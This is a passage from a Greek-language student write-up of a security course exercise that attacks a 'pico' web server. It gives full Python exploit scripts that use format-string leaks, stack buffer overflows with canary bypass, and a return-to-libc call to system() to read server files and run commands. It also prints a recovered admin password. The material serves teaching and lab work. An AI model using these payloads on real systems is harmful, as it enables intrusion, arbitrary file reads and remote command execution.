      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      auth_ret = text_obj[-1]

      offset_srv_ulti = 0x145

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(srv_ulti)

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      print(response.text)
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port>
      # eg.: python3 bof.py 8000
      ```

      </p>
   </details>
<br/>

10. Ωστόσο, παρατηρήσαμε ότι καθυστερεί υπερβολικά να στείλει την απάντηση και τρέχοντας το τοπικά, είδαμε ότι αλλάζοντας απλά το return 
    address της `check_auth()` ώστε να πάει κατευθείαν στην **κλήση** της **`serve_ultimate()`**, τότε προκύπτει **SIGSEGV**, το οποίο οφείλεται 
    στο ότι η `serve_ultimate()` επιστρέφει κανονικά στην **`route()`** και όταν φτάνει στη γραμμή main.c:**63** όπου γίνεται το **`free()`**, 
    το όρισμα της (**given_pwd**) που θα αρχικοποιούνταν αμέσως μετά την κανονική επιστροφή της `post_param()`, δεν έχει τελικά αρχικοποιηθεί και έτσι
    έχοντας μια τυχαία τιμή προκύπτει το ***segmentation fault***.
    
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/24-Serve_Ultimate_SIGSEGV.png)
    
    Κάνοντας kill το process που εξυπηρετούσε το τρέχον request, στέλνεται το περιεχόμενο του _ultimate.html_, κάτι που σημαίνει ότι έχουν σταλεί 
    τα δεδομένα στο pipeline, αλλά δεν έχει γίνει flush ο buffer του stdout και γι'αυτό δεν έρχονται άμεσα οι απαντήσεις.    
<br/>

11. Έτσι, βρήκαμε έναν εναλλακτικό τρόπο να πάρουμε το αρχείο χωρίς να χαλάσει η ροή της υπόλοιπης εκτέλεσης. 

    Υπολογίσαμε νέα offsets μεταξύ της πρώτης εντολής της **`serve_ultimate()`** και της πραγματικής return address της `check_auth()` έτσι ώστε 
    να μπορέσουμε να ελέγξουμε και το που θα επιστρέψει η `serve_ultimate()` μόλις ολοκληρωθεί, κάτι που δε γίνεται αν χρησιμοποιήσουμε την κλήση 
    της συνάρτησης μέσω της εντολής `call`, γιατί η εντολή αυτή κάνει push το πραγματικό return address της εκάστοτε συνάρτησης που καλεί, κάτι 
    που δεν μπορούμε να αλλάξουμε, εφόσον γίνεται σε μεταγενέστερο χρόνο από το BOF.
 
    |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
    |-|-|
    |1η εντολή της `serve_ultimate()` | **0x870** |
    |Επιστροφή της `serve_ultimate()` παρακάμπτοντας την `free()` | **0x169**|
    
    ```python
    ...
    binary_payload = BytesIO()
    binary_payload.write(("p" * 100).encode("utf-8"))
    binary_payload.write(canary)
    binary_payload.write(("p" * 8).encode("utf-8"))
    binary_payload.write(svd_ebp)
    binary_payload.write(srv_ulti)
    binary_payload.write(safe_ret)
    ...
    ```
    <details>
    <summary><b>Click here to see the full script</b></summary>
       <p>

       ```python
       import pycurl
       import struct
       import base64
       import requests
 
       from sys import argv
       from io  import BytesIO
 
       # Sending 1st payload to / for getting the canary value and
       # the return address of check_auth() from reposnse headers
       url = 'http://localhost:' + argv[1] + '/'
 
       username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
       input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
       response = requests.request("GET", url, headers=input_headers)
       text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
 
       # Building the payload
       canary   = text_obj[-3]
       ebp      = text_obj[-2]
       auth_ret = text_obj[-1]
      
       offset_srv_ulti = 0x870
       offset_safe_ret = 0x169 
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
       srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)
       safe_ret = struct.pack('<L', int(auth_ret, base=16) + offset_safe_ret)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
       binary_payload.write(canary)
       binary_payload.write(("p" * 8).encode("utf-8"))
       binary_payload.write(svd_ebp)
       binary_payload.write(srv_ulti)
       binary_payload.write(safe_ret)
 
       # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
       url = 'http://localhost:' + argv[1] + '/ultimate.html'
       authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
       headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
       response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
 
       print(response.text)

      # ------------------------------------------------------
      # Run: python3 bof.py <port>
      # eg.: python3 bof.py 8000
       ```
 
       </p>
    </details><br/>
    
    Ετσι, πετύχαμε να παίρνουμε το **ultimate.html** άμεσα και να κάνουμε το παιδί να τερματίζει ομαλά χωρίς να αφήνουμε κάποιο ίχνος όπως ένα segmentation fault.
    
    Μέσω αυτού λοιπόν, βρήκαμε τις πληροφορίες για τα ***Preliminary Results of Plan Y***!
    
    &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/25-Ultimate_Data.png)

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 4 (Code of Plan Z)

1. Αρχικά είδαμε μέσα στο _ultimate.html_ που πήραμε από το ποηγούμενο βήμα, ότι γίνεται αναφορά σε κάποιο **z.log**, άρα έπρεπε να 
   πάρουμε το περιεχόμενο του για το τελευταίο βήμα.

2. Έτσι, σκεφτήκαμε να κάνουμε στοχευμένη κλήση της **`send_file()`** με όρισμα το **z.log**, ωστε να μας το στείλει όπως στάλθηκε το _ultimate.html_.

   Πρώτα υπολογίσαμε τα καινούργια offsets. Βρήκαμε την απόσταση της πρώτης εντολής της **`send_file()`** από το return address της 
   `check_auth()` για να την καλέσουμε δίνοντας τα δικά μας ορίσματα και αλλάζοντας τη διεύθυνση επιστροφής της σε κάποια safe διεύθυνση 
   ώστε να απφύγουμε το segmentation fault. Επίσης, τοποθετούσαμε το string που θα έπαιρνε σαν όρισμα η `send_file()` στην αρχή του πίνακα 
   **char post_data[100]**. 
   
   Παρόλο που μετά την ολοκλήρωση της `post_param()` το stack frame της θα "χανόταν", μαζί και ο τοπικός της πίνακας τα δεδομένα θα παρέμεναν 
   στην ίδια θέση και θα ήταν προσβάσιμα από το πρόγραμμα, όπως και διαπιστώσαμε μέσω του gdb, ενώ παράλληλα με την κλήση της `send_file()` 
   ξαναμπαίνουν αυτά τα δεδομένα στο ενεργό stack frame της. Έτσι, παρόλο που αυτές οι θέσεις θα ξαναχρησιμοποιηθούν από τη `send_file()`, είναι 
   αρκετά χαμηλά και δεν προλαβαίνουν να γίνουν overwrite και καλείται η `fopen()` κανονικά.
   
   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
   |-|-|
   |1η εντολή της `send_file()` | **0x656** |
   |Επιστροφή της `send_file()` σε safe address | **0x169**|
   |Αρχή του πίνακα `post_data` σε σχέση με τον **ebp** της post_param | **0x110**|
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(srv_ulti)
   binary_payload.write(safe_ret)
   ...
   ```
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import pycurl
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      auth_ret = text_obj[-1]

      offset_srv_ulti = 0x870
      offset_safe_ret = 0x169 

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)
      safe_ret = struct.pack('<L', int(auth_ret, base=16) + offset_safe_ret)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(srv_ulti)
      binary_payload.write(safe_ret)

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      print(response.text)
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port> <file_to_retrieve>
      # eg.: python3 bof.py 8000 /var/log/z.log
      ```
       
      </p>
   </details><br/>
    
3. Ωστόσο, συνειδητοποίησαμε μετά από χρήση πολλών μεθόδων πραγματοποιήσης των requests (postman, curl, python libraries), ότι δεν μπορούσαν να 
   σταλθούν τα δεδομένα που θέλαμε επειδή έλειπαν τα headers που πρέπει να λάβει πρώτα σαν απάντηση το κάθε request (eg. **HTTP/1.1 200 OK\r\n\r\n**).
   
   Παρόλ'αυτά, η πρώτη γραμμή κάθε αρχείου που ζητάγαμε να διαβάσουμε επέστρεφε μέσα στο exception που προκαλούσε η python.
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/26-Request_Exception_Results.png)
   
   Θα μπορούσαμε λοιπόν, να φτιάξουμε ένα script που να κάνει πολλαπλά requests παίρνοντας γραμμή γραμμή κάθε αρχείο, κάτι που βέβαια θα ήταν ιδιαίτερα
   αντιπαραγωγικό.
   <br/>
    
4. Έτσι, έπρεπε να βρούμε έναν τρόπο να στείλουμε πρώτα αυτά τα headers για να εγκαθιδρυθεί η σύνδεση και να μπορέσει να στείλει και τα υπόλοιπα δεδομένα.
   
   Για να το πετύχουμε αυτό, χρησιμοποιήσαμε το attack που κάναμε στο προηγούμενο part. Κάναμε αρχικά return στην `serve_ultimate()`, η οποία στέλνει τα 
   headers by default και μαζί στέλενει και το _ultimate.html_ και ακολούθως, αντί να επιστρέψουμε στην εντολή αμέσως μετά το `free()` όπως πριν, επιστρέφαμε
   στη **`send_file()`**, για 2<sup>η</sup> φορά πλέον, δίνοντας το δικό μας εκάστοτε όρισμα.
   
   Κάνοντας το όμως τοποθετώντας το string που θα έπαιρνε σαν είσοδο η `send_file()` στον πίνακα **post_data**, η κλήση της `serve_ultimate()` και η αποστολή 
   του _ultimate.html_ κάνει overwrite το όρισμά μας και τελικά αποτυγχάνει το attack.
   
   Έτσι, έπρεπε να βρούμε έναν άλλον πίνακα ή κάποιες θέσεις μνήμης για να γράψουμε το argument της `send_file()`. Βρήκαμε τελικά ότι ακριβώς πριν την κλήση 
   της **`post_param()`** δηλώνεται ένας πίνακας **100** θέσεων στον οποίο θα μπορούσαμε να γράψουμε τα δεδομένα που θέλουμε. 
   
   Αυτός ο πίνακας τοποθετείται **0x70 = 112 bytes** κάτω από την αρχή του stack frame της `route()`, κάτι που σημαίνει ότι είναι αρκετά κοντά με την αρχή 
   του stack frame της `post_param()`, καθώς αρχικοποιείται με **0x84 = 132 bytes**. Έτσι, εξασφαλίζουμε ότι δε θα επικαλυφθούν ιδιαίτερα σημαντικά δεδομένα 
   της `route()` και θα μπορέσει μετά να συνεχιστεί η ομαλή εκτέλεσή της.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/27-Route_Stack_Frame_Size.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/28-Admin_pwd_Position.png)|
   |-|-|
   
   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
   |-|-|
   |1η εντολή της `serve_ultimate()` | **0x870** |
   |1η εντολή της `send_file()` | **0x656** |
   |Επιστροφή της `send_file()` σε safe address | **0x169**|
   |Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της post_param | **0x8C**|
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(ulti_ret)
   binary_payload.write(sndf_ret)
   binary_payload.write(fin_ret)
   binary_payload.write(argument)
   binary_payload.write((argv[2] + "&").encode("utf-8"))
   ...
   ```
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import pycurl
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      auth_ret = text_obj[-1]

      offset_to_srv_ulti = 0x870
      offset_to_send_fl  = 0x656
      offset_to_fin_ret  = 0x169
      offset_to_pdata    = 0x8C

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_pdata)
      fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
      sndf_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_send_fl)
      ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(ulti_ret)
      binary_payload.write(sndf_ret)
      binary_payload.write(fin_ret)
      binary_payload.write(argument)
      binary_payload.write((argv[2] + "&").encode("utf-8"))

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      # Uncomment for removing ultimate.html from output
      print(response.text)
      # print(response.text[173:])
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port> <file_to_retrieve>
      # eg.: python3 bof.py 8000 /var/log/z.log
      ```
       
      </p>
   </details><br/>
   
   Έτσι, πήραμε το περιεχόμενο του **z.log**!
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/29-Z_Log_Data.png)

<br/>

5. Στη συνέχεια πήραμε τον κωδικό που είναι στο /etc/admin_pwd για να μπορούμε να μπαίνουμε και κανονικά στο ultimate.html μέσω browser.
   
   > Password: **kdje34123asdfasd23D**   
<br/>

6. Μέσα στο **z.log** βρήκαμε τις πληροφορίες που θα μας οδηγούσαν στον κωδικό του Plan_Z.

   Το πρώτο κομμάτι του κωδικού το αποκρυπτογραφήσαμε εύκολα, βρίσκοντας πληροφορίες για ένα εξαιρετικά ιστορικό σκακιστικό παιχνίδι μεταξύ 
   του **Garry Kasparov** και του **Deep Blue**. [<sup>\[15\]</sup>](#15--httpsenwikipediaorgwikideep_blue_versus_garry_kasparovgame_6_2)[<sup>\[16\]</sup>](#16--httpwwwkasparovcomtimeline-eventdeep-blue)
   
   Έτσι η κίνηση που έπρεπε να βρούμε ήταν η εκείνη που έκανε τον Kasparov να παραιτηθεί από την παρτίδα και να δώσει τη νίκη στον Deep Blue.
   
   Εν προκειμένω πρόκειται για την κίνηση **c4**.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/30-Kasparov_vs_Deep_Blue_Mov18.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/31-Kasparov_vs_Deep_Blue_Mov19.png)|
   |-|-|
    
<br/>

7. Έμενε πλέον να βρούμε την Public IP του μηχανήματος στο οποίο τρέχει ο pico server.
   
   Αρχικά, αναζητούσαμε επιθέσεις όπως **SSL Certificates Attack**. [<sup>\[17\]</sup>](#17--httpswwwnetsparkercomblogweb-securityexposing-public-ips-tor-services-through-ssl-certificates)[<sup>\[18\]</sup>](#18--httpswwwbleepingcomputercomnewssecuritypublic-ip-addresses-of-tor-sites-exposed-via-ssl-certificates)
   Ωστόσο, σύντομα είδαμε ότι δεν θα αποδώσει ο τρόπος αυτός κάποιο αποτέλεσμα και ξαναγυρίσαμε στην ιδέα κάποιου πιο advanced **BOF**.
   
   Πρώτα, κάναμε retrieve πάρα πολλά αρχεία του συστήματος με το attack του προηγούμενου βήματος, όπως αρχεία του **`/proc/net/`** directory, μήπως και βρισκόταν
   κάπου εκεί η Public IP του μηχανήματος.
   
   Το σημαντικότερο από αυτά που βρήκαμε ήταν η IP του Guard Relay του server στο Tor: **153.92.127.239:443** _(Netherlands)_
   
<br/>

8. Στη συνέχεια λοιπόν, σκεφτήκαμε να κάνουμε το **Return to Libc Attack**.

   Δεδομένου ότι οι διευθύνσεις των βιβλιοθηκών βρίσκονται σε ξεχωριστό segment από αυτό του code segment, θα έπρεπε κάπως να βρούμε τουλάχιστον μια
   διεύθυνση μέσα σε αυτό, ώστε να μπορέσουμε να υπολογίσουμε με offsets την κλήση που θέλουμε να κάνουμε.
   
   Υπάρχει ένα αρχείο το οποίο περιέχει όλο το **memory mapping** του μηχανήματος, από το οποίο μπορούμε να πάρουμε τις διευθύνσεις στις οποίες βρίσκεται
   το segment της libc.
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/32-Pico_Machine_Memory_Mapping.png)
   
   Ωστόσο, πριν το βρούμε αυτό, βρήκαμε τη διεύθυνση επιστροφής της `main()` που επιστρέφει σε αυτό το segment και μετά μέσω υπολογισμού των νέων offsets 
   καταφέραμε να κάνουμε κλήση της **`system()`** με όρισμα που θα εκτελούσε την εντολή: **`curl ifconfig.me`**.
  
<br/>

9. Έχοντας από το προηγούμενο part οτι η απόσταση του **ορίσματος** της `printf()` και του **ebp** της `check_auth()`, είναι ίση με **0x78 = 30\*4 = 120 bytes**, 
   εύκολα υπολογίσαμε ότι έπρεπε να δώσουμε σαν payload: **%111$x**, για να πάρουμε το return address της **`main()`**, υπολογίζοντας απλά την απόσταση μεταξύ της
   διεύθυνσης του **ebp της `main()`** και της διεύθυνσης του **ebp της `check_auth()`**, που είναι ίση με: **0x140 = 80\*4 = 320 bytes**. \
   Άρα, έχουμε συνολικά: **(30 + 80 + 1)\*4 = 120 + 320 + 4 = 444 = _111_\*4**
   > <h5>Σημείωση: Χρησιμοποιείται η διεύθυνση του κάθε ebp, γιατί η τιμή του είναι η διεύθυνση της καλούσας συνάρτησης</h5>
   
   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
   |-|-|
   |1η εντολή της `serve_ultimate()` | **0x870** |
   |1η εντολή της `systen()` | **0x22769** |
   |Επιστροφή της `system()` σε safe address | **0x169**|
   |Θέση του command για τη `system()` σε σχέση με τον **ebp** της post_param | **0x8C**|
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(ulti_ret)
   binary_payload.write(sys_ret)
   binary_payload.write(fin_ret)
   binary_payload.write(argument)
   binary_payload.write((argv[2] + "&").encode("utf-8"))
   ...
   ```
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import pycurl
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x %111$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-4]
      ebp      = text_obj[-3]
      auth_ret = text_obj[-2]
      main_ret = text_obj[-1]

      offset_to_srv_ulti = 0x870
      offset_to_fin_ret  = 0x169
      offset_to_arg      = 0x8C
      offset_to_system   = 0x22769

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_arg)
      fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
      ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)
      sys_ret  = struct.pack('<L', int(main_ret, base=16) + offset_to_system)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(ulti_ret)
      binary_payload.write(sys_ret)
      binary_payload.write(fin_ret)
      binary_payload.write(argument)
      binary_payload.write((argv[2] + "&").encode("utf-8"))

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      # Uncomment for removing ultimate.html from output
      print(response.text)
      # print(response.text[173:])
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port> <command>
      # eg.: python3 bof.py 8000 "curl ifconfig.me"
      ```
       
      </p>
   </details><br/>
   
   Έτσι, βρήκαμε τελικά την **Public IP** του μηχανήματος!
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/33-Public_IP.png)

   Και τελικά έχουμε την απάντηση και του τελευταίου Part, την οποία σας δίνουμε με ένα χιουμοριστικό τρόπο:
   
   > Been a while since we started our journey through time. \
   > We were wandering alone on every timeline.
   >
   > Trolling everyone in our tricky way \
   > it was then, when we found it, at 11 of May.
   >
   > It was a furious battle, between man and machine, \
   > the likes of which, the history had never seen.
   >
   > And once it made its final move, \
   > c4 became Kasparov's doom.
   >
   > The die was casted, Deep Blue had won, \
   > but still... its address remained unknown.
   <br/>
   
   > The final clue was hidden well, \
   > cleverly disguised but time would tell.
   >
   > The task was hard, we gave it all, \
   > we found the guard, it's time to fall.
   >
   > Its 'system' was, its final flaw, \
   > now Cybergh0sts can rule it all.
   >
   > Its address finally has been revealed (3.85.143.73), \
   > and now nothing can be concealed.
   <br/>
   
   > We now have the code to reach you in the past, \
   > thank you for the journey we longed to have at last.
   >
   > We had a great experience, but now comes the time \
   > to go back to the future, to our timeline.
   <br/>
   
   > Oh, we almost forgot... \
   > Before we depart and leave without \
   > the code is <c4\><3.85.143.73\>
   >
   > Cybergh0sts out!
   <br/>

## Improvements

Μετά το τελευταίο attack μέσω του **ret2libc**, σκεφήκαμε και υλοποιήσαμε διάφορους τρόπους, ώστε να παρακάμψουμε ή να στείλουμε τα headers 
που χρειάζονται με διαφορετικό τρόπο, χωρίς να στέλνεται και το ultimate.html μαζί.

### Call `printf()`

Το πρώτο που δοκιμάσαμε ήταν να κάνουμε εμείς κλήση της `printf()` δίνοντας της σαν όρισμα τα headers που θέλουμε.

Αυτό ενέχει διάφορα προβλήματα, κυρίως λόγω του ότι έχουμε να χειριστούμε με την επιστροφή και τα ορίσματα **2** συναρτήσεων που και οι δύο 
παίρνουν κάποιο όρισμα. Γενικά, πριν από κάθε κλήση συνάρτησης στο παρόν πρόγραμμα, ο **esp** αυξανόταν κατά **0x10 = 16 bytes** και μετά από 
την επιστροφή της μειωνόταν κατά τό ίδιο ποσό. Έτσι, θα έπρεπε κάπως να "καταναλώνουμε" το όρισμα της `printf()` πρωτού επιστρέψουμε στην `system()`.

Για να το πετύχουμε αυτό, αυξάναμε εικονικά τον esp κατά **0x10** _(συμπεριλαμβανομένου και του ορίσματος)_ και επιστρέφαμε σε ένα κομμάτι 
κώδικα που έκανε την επαναφορά αυτών των **0x10 bytes**.

Όμως, προέκυπταν άλλα θέματα με τις αλλαγές του **ebp**. Από το κομμάτι αυτό που έκανε την επαναφρορά του **esp** και κατανάλωνε τα **0x10 bytes**, 
η κλήση επέστρεφε μέσα στη **`route()`**. 

Έτσι, θα έπρεπε να πειράξουμε το return address της `route()` ώστε όταν επιστρέψει να καλέστει η **`system()`** και μετά από εκεί να γίνει ομαλός 
τερματισμός της εκτέλεσης.

Τελικά καταφέραμε να πραγματοποιήσουμε αυτό το attack και να παρακάμψουμε την αποστολή του _ultimate.html_.

Παρακάτω παρατίθεται και ο σχετικός κώδικας.

|Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
|-|-|
|1η εντολή της `send_file()` | **0x870** |
|Επιστροφή της `send_file()` σε safe address | **0xF4E**|
|1η εντολή της `printf()` | **0x31039** |
|Επιστροφή της `printf()` σε safe address | **0x169**|
|Θέση των headers για την `printf()` σε σχέση με τον **ebp** της post_param | **0x90**|
|Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της post_param | **0x7C**|

```python
...
binary_payload = BytesIO()
binary_payload.write(("p" * 100).encode("utf-8"))
binary_payload.write(canary)
binary_payload.write(("p" * 4).encode("utf-8"))
binary_payload.write(svd_ebx)
binary_payload.write(svd_ebp)
binary_payload.write(prtf_ret)
binary_payload.write(safe_ret)
binary_payload.write(prtf_arg)
binary_payload.write(("HTTP/1.1 200 OK\r\n\r\n&").encode("utf-8"))
binary_payload.write((argv[2] + "&").encode("utf-8"))
binary_payload.write(("p" * (108 - len(argv[2]) + 3)).encode("utf-8"))
binary_payload.write(canary)
binary_payload.write(("p" * 4).encode("utf-8"))
binary_payload.write(svd_rt_ebx)
binary_payload.write(svd_rt_ebp)
binary_payload.write(sndf_ret)
binary_payload.write(fin_ret)
binary_payload.write(argument)
...
```
<details>
<summary><b>Click here to see the full script</b></summary>
   <p>

   ```python
   import sys
   import pycurl
   import struct
   import base64
   import requests

   from sys import argv
   from io  import BytesIO


   url = 'http://localhost:' + argv[1] + '/'

   header_data_b64 = base64.b64encode(bytes('%27$x %29$x %30$x %31$x %69$x %70$x %111$x', 'utf-8'))
   headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
   response = requests.request("GET", url, headers=headers)
   resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

   # Building the payload
   canary       = resp_data[-7]
   ebx          = resp_data[-6]
   ebp          = resp_data[-5]
   auth_ret     = resp_data[-4]
   route_ebx    = resp_data[-3] 
   route_ebp    = resp_data[-2] 
   main_ret     = resp_data[-1]

   offset_to_send_fl  = 0x656
   offset_to_fin_ret  = 0xF4E
   offset_to_printf   = 0x31039
   offset_to_safe_ret = 0x169
   offset_to_headers  = 0x90
   offset_to_path     = 0x7C

   canary     = struct.pack('<L', int(canary   , base=16))
   svd_ebx    = struct.pack('<L', int(ebx      , base=16))
   svd_ebp    = struct.pack('<L', int(ebp      , base=16))
   svd_rt_ebx = struct.pack('<L', int(route_ebx, base=16))
   svd_rt_ebp = struct.pack('<L', int(route_ebp, base=16))
   prtf_arg   = struct.pack('<L', int(ebp      , base=16) - offset_to_headers)
   argument   = struct.pack('<L', int(ebp      , base=16) - offset_to_path)
   prtf_ret   = struct.pack('<L', int(main_ret , base=16) + offset_to_printf)
   fin_ret    = struct.pack('<L', int(auth_ret , base=16) + offset_to_fin_ret)
   sndf_ret   = struct.pack('<L', int(auth_ret , base=16) + offset_to_send_fl)
   safe_ret   = struct.pack('<L', int(auth_ret , base=16) + offset_to_safe_ret)

   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 4).encode("utf-8"))
   binary_payload.write(svd_ebx)
   binary_payload.write(svd_ebp)
   binary_payload.write(prtf_ret)
   binary_payload.write(safe_ret)
   binary_payload.write(prtf_arg)
   binary_payload.write(("HTTP/1.1 200 OK\r\n\r\n&").encode("utf-8"))
   binary_payload.write((argv[2] + "&").encode("utf-8"))
   binary_payload.write(("p" * (108 - len(argv[2]) + 3)).encode("utf-8"))
   binary_payload.write(canary)
